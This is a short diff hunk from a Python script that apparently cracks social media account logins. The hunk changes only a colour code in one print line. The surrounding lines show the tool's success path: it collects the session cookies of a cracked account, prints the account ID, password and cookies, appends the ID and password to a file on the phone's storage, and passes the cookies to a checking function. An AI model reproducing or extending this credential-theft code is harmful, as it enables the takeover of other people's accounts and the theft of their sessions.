@@ -546,7 +546,7 @@ def crack(idf,pwv):
                                 ok+=1
                                 coki=po.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])        
-                                print(f'\r\x1b[1;96m[RAWA-OK]\x1b[1;91m   {idf} | \x1b[0;96m{pw} | \033[95m{kuki}')
+                                print(f'\r\x1b[1;96m[RAWA-OK]\x1b[1;91m   {idf} | \x1b[0;96m{pw} | \33[1;96m{kuki}')
                                 open('/sdcard/HaWa-𝑂𝐾.txt','a').write(idf+' | '+pw+'\n')
                                 cek_DYNO(kuki)
                                 break
